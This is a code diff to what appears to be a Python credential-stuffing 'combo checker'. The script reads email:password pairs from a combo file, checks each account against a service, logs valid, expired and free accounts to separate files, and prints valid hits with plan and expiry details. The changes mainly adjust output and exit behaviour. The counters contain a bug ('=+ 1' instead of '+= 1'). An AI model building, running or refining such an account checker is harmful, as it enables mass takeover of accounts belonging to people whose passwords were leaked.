@@ -48,10 +48,10 @@ print('\nStarting ...\n')
 time.sleep(2)
 combo = open('combo.txt', 'r')
 
-good = 0
-bad = 0
-free = 0
-expired = 0
+# good = 0
+# bad = 0
+# free = 0
+# expired = 0
 
 uniq = str(datetime.datetime.now().date()) + '_' + str(datetime.datetime.now().time()).replace(':', '.')
 
@@ -69,7 +69,7 @@ while True:
     line = combo.readline()
     
     if not line:
-        print("\nDone. EXITING ...")
+        input("\nDone. Press Enter to EXIT.")
         time.sleep(2)
         break
     x = line.split(":")
@@ -161,20 +161,17 @@ while True:
                 requests.get(url).json()
 
             if show == 1:
-                os.system('color 2')
-                print("[VALID]",email,":",password)
+                print("[VALID]",email,":",password,"| Plan :",title,"| Description :",description,"| Expiry : ",exp_str)
 
         else:
             expired =+ 1
             expiredf.writelines([f"{email}:{password}\n"])
 
             if show == 1:
-                os.system('color 4')
                 print("[Expired]",email,":",password)
 
     else:
         free =+ 1
         freef.writelines([f"{email}:{password}\n"])
         if show == 1:
-            os.system('color 4')
             print("[Free]",email,":",password)
